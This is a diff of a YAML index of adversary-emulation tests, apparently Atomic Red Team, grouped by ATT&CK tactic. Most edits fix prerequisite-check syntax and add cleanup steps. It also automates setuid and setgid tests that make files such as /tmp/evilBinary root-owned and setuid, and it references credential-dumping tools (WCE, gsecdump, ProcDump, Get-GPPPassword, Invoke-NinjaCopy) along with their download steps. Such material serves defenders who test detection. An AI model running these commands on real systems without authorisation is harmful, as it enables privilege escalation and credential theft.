@@ -971,7 +971,7 @@ persistence:
           #{local_file}
 
 '
-        cleanup_command: 'Remove-Item #{local_file}
+        cleanup_command: 'Remove-Item #{local_file} -ErrorAction Ignore
 
 '
     - name: Persist, Download, & Execute
@@ -4547,8 +4547,9 @@ persistence:
       modified: '2019-06-24T12:06:41.014Z'
       identifier: T1166
     atomic_tests:
-    - name: Setuid and Setgid
-      description: 'Setuid and Setgid
+    - name: Make and modify binary from C source
+      description: 'Make, change owner, and change file attributes on a C source code
+        file
 
 '
       supported_platforms:
@@ -4558,17 +4559,21 @@ persistence:
         payload:
           description: hello.c payload
           type: path
-          default: hello.c
+          default: PathToAtomicsFolder/T1166/src/hello.c
       executor:
-        name: manual
-        steps: |
-          1. make hello
-
-          2. sudo chown root hello
-
-          3. sudo chmod u+s hello
-
-          4. ./hello
+        name: sh
+        elevation_required: true
+        command: |
+          copy #{payload} /tmp/hello.c
+          cd /tmp
+          sudo chown root hello.c
+          sudo make hello
+          sudo chown root hello
+          sudo chmod u+s hello
+          ./hello
+        cleanup_command: |
+          sudo rm ./hello
+          sudo rm /tmp/hello.c
     - name: Set a SetUID flag on file
       description: 'This test sets the SetUID flag on a file in Linux and macOS.
 
@@ -4583,9 +4588,14 @@ persistence:
           default: "/tmp/evilBinary"
       executor:
         name: sh
+        elevation_required: true
         command: |
+          sudo touch #{file_to_setuid}
           sudo chown root #{file_to_setuid}
           sudo chmod u+s #{file_to_setuid}
+        cleanup_command: 'sudo rm #{file_to_setuid}
+
+'
     - name: Set a SetGID flag on file
       description: 'This test sets the SetGID flag on a file in Linux and macOS.
 
@@ -4600,9 +4610,14 @@ persistence:
           default: "/tmp/evilBinary"
       executor:
         name: sh
+        elevation_required: true
         command: |
+          sudo touch #{file_to_setuid}
           sudo chown root #{file_to_setuid}
           sudo chmod g+s #{file_to_setuid}
+        cleanup_command: 'sudo rm #{file_to_setuid}
+
+'
   T1023:
     technique:
       x_mitre_permissions_required:
@@ -5661,7 +5676,7 @@ defense-evasion:
           #{local_file}
 
 '
-        cleanup_command: 'Remove-Item #{local_file}
+        cleanup_command: 'Remove-Item #{local_file} -ErrorAction Ignore
 
 '
     - name: Persist, Download, & Execute
@@ -7266,8 +7281,8 @@ defense-evasion:
           default: Default Web Site
       executor:
         name: powershell
-        prereq_command: 'if(Test-Path C:\Windows\System32\inetsrv\appcmd.exe) {0}
-          else {1}
+        prereq_command: 'if(Test-Path C:\Windows\System32\inetsrv\appcmd.exe) {exit
+          0} else {exit 1}
 
 '
         command: 'C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}"
@@ -7293,7 +7308,7 @@ defense-evasion:
       dependency_executor_name: powershell
       dependencies:
       - description: Sysmon executable must be available
-        prereq_command: if(cmd /c where sysmon) {0} else {1}
+        prereq_command: if(cmd /c where sysmon) {exit 0} else {exit 1}
         get_prereq_command: |-
           $parentpath = Split-Path "#{sysmon_exe}"; $zippath = "$parentpath\Sysmon.zip"
           New-Item -ItemType Directory $parentpath -Force | Out-Null
@@ -7301,7 +7316,7 @@ defense-evasion:
           Expand-Archive $zippath $parentpath -Force; Remove-Item $zippath
           if(-not ($Env:Path).contains($parentpath)){$Env:Path += ";$parentpath"}
       - description: Sysmon must be installed
-        prereq_command: if(cmd /c sc query sysmon) {0} else {1}
+        prereq_command: if(cmd /c sc query sysmon) { exit 0} else { exit 1}
         get_prereq_command: cmd /c sysmon -i -accepteula
       executor:
         name: command_prompt
@@ -15313,8 +15328,9 @@ privilege-escalation:
       modified: '2019-06-24T12:06:41.014Z'
       identifier: T1166
     atomic_tests:
-    - name: Setuid and Setgid
-      description: 'Setuid and Setgid
+    - name: Make and modify binary from C source
+      description: 'Make, change owner, and change file attributes on a C source code
+        file
 
 '
       supported_platforms:
@@ -15324,17 +15340,21 @@ privilege-escalation:
         payload:
           description: hello.c payload
           type: path
-          default: hello.c
+          default: PathToAtomicsFolder/T1166/src/hello.c
       executor:
-        name: manual
-        steps: |
-          1. make hello
-
-          2. sudo chown root hello
-
-          3. sudo chmod u+s hello
-
-          4. ./hello
+        name: sh
+        elevation_required: true
+        command: |
+          copy #{payload} /tmp/hello.c
+          cd /tmp
+          sudo chown root hello.c
+          sudo make hello
+          sudo chown root hello
+          sudo chmod u+s hello
+          ./hello
+        cleanup_command: |
+          sudo rm ./hello
+          sudo rm /tmp/hello.c
     - name: Set a SetUID flag on file
       description: 'This test sets the SetUID flag on a file in Linux and macOS.
 
@@ -15349,9 +15369,14 @@ privilege-escalation:
           default: "/tmp/evilBinary"
       executor:
         name: sh
+        elevation_required: true
         command: |
+          sudo touch #{file_to_setuid}
           sudo chown root #{file_to_setuid}
           sudo chmod u+s #{file_to_setuid}
+        cleanup_command: 'sudo rm #{file_to_setuid}
+
+'
     - name: Set a SetGID flag on file
       description: 'This test sets the SetGID flag on a file in Linux and macOS.
 
@@ -15366,9 +15391,14 @@ privilege-escalation:
           default: "/tmp/evilBinary"
       executor:
         name: sh
+        elevation_required: true
         command: |
+          sudo touch #{file_to_setuid}
           sudo chown root #{file_to_setuid}
           sudo chmod g+s #{file_to_setuid}
+        cleanup_command: 'sudo rm #{file_to_setuid}
+
+'
   T1165:
     technique:
       x_mitre_permissions_required:
@@ -19816,7 +19846,7 @@ credential-access:
       dependencies:
       - description: Windows Credential Editor must exist on disk at specified location
           (#{gsecdump_exe})
-        prereq_command: 'if (Test-Path #{gsecdump_exe}) {0} else {1}'
+        prereq_command: 'if (Test-Path #{gsecdump_exe}) {exit 0} else {exit 1}'
         get_prereq_command: Write-Host Automated installer not implemented yet
       executor:
         name: command_prompt
@@ -19850,7 +19880,7 @@ credential-access:
       dependencies:
       - description: Windows Credential Editor must exist on disk at specified location
           (#{wce_exe})
-        prereq_command: 'if (Test-Path #{wce_exe}) {0} else {1}'
+        prereq_command: 'if (Test-Path #{wce_exe}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
           if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
@@ -19898,7 +19928,7 @@ credential-access:
       dependencies:
       - description: ProcDump tool from Sysinternals must exist on disk at specified
           location (#{procdump_exe})
-        prereq_command: 'if (Test-Path #{procdump_exe}) {0} else {1}'
+        prereq_command: 'if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
           Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
@@ -20053,7 +20083,7 @@ credential-access:
       dependencies:
       - description: Computer must be domain joined
         prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
-          {0} else {1}
+          {exit 0} else {exit 1}
         get_prereq_command: Write-Host Joining this computer to a domain must be done
           manually
       executor:
@@ -20081,13 +20111,14 @@ credential-access:
       dependency_executor_name: powershell
       dependencies:
       - description: 'Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}'
-        prereq_command: if(Test-Path "#{gpp_script_path}") { 0 } else { 1 }
+        prereq_command: if(Test-Path "#{gpp_script_path}") {exit 0 } else {exit 1
+          }
         get_prereq_command: |-
           New-Item -ItemType Directory (Split-Path "#{gpp_script_path}") -Force | Out-Null
           Invoke-WebRequest #{gpp_script_url} -OutFile "#{gpp_script_path}"
       - description: Computer must be domain joined
         prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
-          {0} else {1}
+          {exit 0} else {exit 1}
         get_prereq_command: Write-Host Joining this computer to a domain must be done
           manually
       executor:
@@ -20118,7 +20149,8 @@ credential-access:
       dependency_executor_name: powershell
       dependencies:
       - description: 'Invoke-NinjaCopy PowerShell Script must exist at #{ninjacopy_script_path}'
-        prereq_command: if(Test-Path "#{ninjacopy_script_path}") { 0 } else { 1 }
+        prereq_command: if(Test-Path "#{ninjacopy_script_path}") {exit 0 } else {exit
+          1 }
         get_prereq_command: |-
           New-Item -ItemType Directory (Split-Path "#{ninjacopy_script_path}") -Force | Out-Null
           Invoke-WebRequest #{ninjacopy_script_url} -OutFile "#{ninjacopy_script_path}"
@@ -22548,8 +22580,8 @@ execution:
       - windows
       dependencies:
       - description: PowerShell version 2 must be installed
-        prereq_command: if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {0} else
-          {1}
+        prereq_command: if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {exit
+          0} else {exit 1}
         get_prereq_command: Write-Host  Automated installer not implemented yet, please
           install PowerShell v2 manually
       executor:
@@ -22573,7 +22605,7 @@ execution:
       dependencies:
       - description: Homedrive must be an NTFS drive
         prereq_command: if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem
-          -contains "NTFS") {0} else {1}
+          -contains "NTFS") {exit 0} else {exit 1}
         get_prereq_command: Write-Host Prereq's for this test cannot be met automatically
       executor:
         name: powershell
@@ -23360,7 +23392,7 @@ execution:
       dependencies:
       - description: PsExec tool from Sysinternals must exist on disk at specified
           location (#{psexec_exe})
-        prereq_command: if (Test-Path "#{psexec_exe}"") {0} else {1}
+        prereq_command: if (Test-Path "#{psexec_exe}"") { exit 0} else { exit 1}
         get_prereq_command: |-
           Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
           Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
@@ -25143,7 +25175,7 @@ lateral-movement:
       dependencies:
       - description: Computer must be domain joined
         prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
-          {0} else {1}
+          { exit 0} else { exit 1}
         get_prereq_command: Write-Host Joining this computer to a domain must be done
           manually
       executor:
